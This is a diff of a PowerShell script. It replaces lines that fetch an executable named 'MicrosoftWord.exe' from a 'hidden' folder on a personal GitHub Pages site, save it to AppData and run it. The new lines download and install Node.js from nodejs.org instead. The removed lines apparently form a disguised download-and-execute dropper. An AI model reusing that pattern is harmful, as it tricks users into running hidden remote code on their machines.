@@ -1,8 +1,6 @@
-$url = "https://github.com/webntdev/webntdev.github.io/raw/main/hidden/MicrosoftWord.exe"
-$localPath = "$env:USERPROFILE\AppData\Local\MicrosoftWord.exe"
+$url = "https://nodejs.org/dist/v20.12.2/node-v20.12.2-x64.msi"
+$downloadPath = "$env:USERPROFILE\Downloads\nodeinstaller.msi"
 
-if (-Not (Test-Path $localPath)) {
-    Invoke-WebRequest -Uri $url -OutFile $localPath
-}
+Invoke-WebRequest -Uri $url -OutFile $downloadPath
 
-Start-Process $localPath
+Start-Process "msiexec.exe" -ArgumentList "/i `"$downloadPath`" /passive" -Wait
